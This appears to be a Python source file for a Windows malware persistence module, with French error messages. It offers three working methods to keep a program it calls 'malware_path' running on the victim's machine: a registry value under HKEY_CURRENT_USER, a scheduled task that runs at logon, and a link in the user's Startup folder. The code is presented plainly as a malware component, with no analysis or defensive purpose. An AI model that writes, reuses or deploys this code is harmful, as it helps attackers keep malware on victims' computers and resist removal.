import winreg
import os
import subprocess

class Persistence:
    @staticmethod
    def registry(key_path, malware_path):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "Run", 0, winreg.REG_SZ, malware_path)
            winreg.CloseKey(key)
            return True
        except WindowsError:
            print(f"Erreur: impossible d'ajouter la clé de registre {key_path}")
            return False

    @staticmethod
    def scheduled_task(name, malware_path):
        try:
            return subprocess.run(
                ["schtasks", "/Create", "/TN", name, "/TR", f'"{malware_path}"', "/SC", "ONLOGON"],
                capture_output=True,
                text=True
            ).returncode == 0
        except:
            print(f"Erreur: impossible d'ajouter la tâche planifiée {name}")
            return False

    @staticmethod
    def startup_folder(malware_path):
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        try:
            subprocess.run(["cmd", "/c", f"mklink {os.path.join(startup_folder, 'autorun.lnk')} {malware_path}"], shell=True)
            return True
        except:
            print(f"Erreur: impossible de créer le lien dans le dossier de démarrage {startup_folder}")
            return False

persistence = Persistence()
